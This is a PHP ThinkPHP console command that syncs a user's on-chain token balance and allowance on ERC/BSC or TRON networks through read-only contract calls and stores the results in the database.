<?php

namespace app\command;

use app\common\model\Assets;
use app\common\model\Token;
use app\common\model\User;
use Carbon\Carbon;
use Exception;
use IEXBase\TronAPI\Provider\HttpProvider;
use IEXBase\TronAPI\Tron;
use think\console\Command;
use think\console\Input;
use think\console\input\Argument;
use think\console\Output;
use think\Db;
use think\facade\Config;
use Throwable;
use xtype\Ethereum\Client as EthereumClient;

class Sync extends Command
{
    protected function configure()
    {
        $this->setName('sync')
            ->addArgument('uid', Argument::REQUIRED, '用户id')
            ->setDescription('链上数据同步');
    }

    protected function execute(Input $input, Output $output)
    {
        $uid = $input->getArgument('uid');
        if (!is_numeric($uid)) {
            $output->write('uid非法，不是数字');
            return false;
        }
        $user = User::where(['id' => $uid])
            ->findOrEmpty();
        if ($user->isEmpty()) {
            $output->write('用户不存在');
            return false;
        }
        $chain = $user['token']['chain'];
        if (!$chain) {
            $output->write('链不存在');
            return false;
        }
        $ret = false;
        switch ($chain) {
            case 'erc':
            case 'bsc':
                $ret = $this->erc($user);
                break;
            case 'trc':
                $ret = $this->trc($user);
                break;
        }
        if (!$ret) {
            $output->writeln('操作失败，请稍后重试');
            return false;
        }
        $output->writeln('ok');
    }

    protected function erc(User $user)
    {
        try {
            $coin = Token::where(['id' => $user['token_id']])
                ->findOrEmpty();
            if ($coin->isEmpty()) {
                throw new Exception('币种不存在');
            }
            $client = new EthereumClient([
                'base_uri' => $coin['url'],
                'timeout' => 30,
            ]);
            //用户钱包
            $address = $user['wallet_address'];
            $symbolCode = $coin['contract_address'];
            //合约
            $contract = $user['contract']['contract_address'];
            $params = [
                'from' => $address,
                'to' => $symbolCode,
                'data' => '0x70a08231000000000000000000000000' . substr($address, 2),
            ];
            $balanceRes = $client->eth_call($params);
            $decimals = $user['token']['contract_decimals'];
            //链上余额
            $balance = hexdec($balanceRes) / pow(10, $decimals);
            $data = '0xdd62ed3e000000000000000000000000'
                . substr($address, 2)
                . '000000000000000000000000'
                . substr($contract, 2);
            $params = [
                'from' => $address,
                'to' => $symbolCode,
                'data' => $data,
            ];
            $approveRes = $client->eth_call($params);
            //授权额
            $approveAmount = hexdec($approveRes) / pow(10, $decimals);

            if ($approveAmount > 0) {
                Db::name('user')->where('id', $user['id'])->update(['is_approve' => 1]);
            }
            $assets = Assets::where(['user_id' => $user['id'], 'token_id' => $user['token']['id']])
                ->findOrEmpty();
            if (!$assets->isEmpty()) {
                $assets['chain_balance'] = $balance;
                $assets['approve_quantity'] = $approveAmount;
                $assets->save();
            }
            $user['sync_time'] = Carbon::now();
            $user->save();
            return true;
        } catch (Throwable $exception) {
            echo $exception->getMessage();
            return false;
        }
    }

    protected function trc(User $user)
    {
        try {
            $network = Config::get('blockchain.network');
            $coin = Token::where(['id' => $user['token_id'], 'network' => $network])
                ->findOrEmpty();
            if ($coin->isEmpty()) {
                throw new Exception('币种不存在');
            }
            $decimals = $coin['contract_decimals'];
            $address = $user['wallet_address'];
            if (strlen($address) !== $coin['address_len']) {
                throw new Exception('地址长度校验失败');
            }

            $assets = Assets::where(['user_id' => $user['id'], 'token_id' => $user['token_id']])
                ->findOrEmpty();
            if ($assets->isEmpty()) {
                throw new Exception('用户资产为空');
            }

            $fullNode = new HttpProvider($coin['url']);
            $solidityNode = new HttpProvider($coin['url']);
            $eventServer = new HttpProvider($coin['url']);

            $tron = new Tron($fullNode, $solidityNode, $eventServer);

            $abi = '[{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"sender","type":"address"},{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"}]';
            $abiAry = json_decode($abi, true);
            $tokenContract = $coin['contract_address'];
            $function = 'balanceOf';
            $params = [
                $tron->toHex($address)
            ];
            $result = $tron->getTransactionBuilder()
                ->triggerConstantContract($abiAry,
                    $tron->toHex($tokenContract),
                    $function,
                    $params,
                    $tron->toHex($address));
            $res = $result[0]->toString();
            if (!is_numeric($res)) {
                throw new Exception('Token balance is not number');
            }

            $function2 = 'allowance';
            $smartContract = $user['contract']['contract_address'];
            $params2 = [
                $tron->toHex($address),
                $tron->toHex($smartContract),
            ];
            $result2 = $tron->getTransactionBuilder()
                ->triggerConstantContract($abiAry,
                    $tron->toHex($tokenContract),
                    $function2,
                    $params2,
                    $tron->toHex($address)
                );

            $res2 = $result2[0]->toString();
            if (!is_numeric($res2)) {
                throw new Exception('Token allowance is not number');
            }

            //链上余额
            $assets['chain_balance'] = bcdiv($res, bcpow('10', $decimals), $decimals);
            //授权额
            $assets['approve_quantity'] = bcdiv($res2, bcpow('10', $decimals), $decimals);
            $assets->save();
            $user['sync_time'] = Carbon::now();
            $user->save();
            return true;
        } catch (Throwable $exception) {
            echo $exception->getMessage();
            return false;
        }
    }

}
